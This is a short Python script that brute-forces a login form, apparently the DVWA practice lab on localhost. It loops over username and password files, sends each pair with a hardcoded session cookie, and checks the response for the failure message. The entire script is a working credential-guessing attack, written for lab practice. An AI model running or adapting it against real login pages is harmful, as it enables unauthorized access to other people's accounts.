import requests
import time
from bs4 import BeautifulSoup

with open("usuarios.txt") as file:
    usuarios = file.read().splitlines()

with open("passwords.txt") as file:
    passwords = file.read().splitlines()

for i in usuarios:
    for j in passwords:
        url = f"http://localhost/vulnerabilities/brute/?username={i}&password={j}&Login=Login#"
        cookie = {'PHPSESSID':'ofq74469agp6fvjmmgv1mqg5d7', 'security':'low'}
        user_agent = {'User-agent': 'MUG/2024.1'}
        respuesta = requests.get(url, cookies=cookie, headers=user_agent)
        soup = BeautifulSoup(respuesta.text, 'html.parser')
        
        search = soup.body.findAll(string="Username and/or password incorrect.")
        
        if len(search) > 0:
            print(f"[x]\t{i}:{j}")
        else:
            print(f"[OK]\t{i}:{j}")
        time.sleep(2)
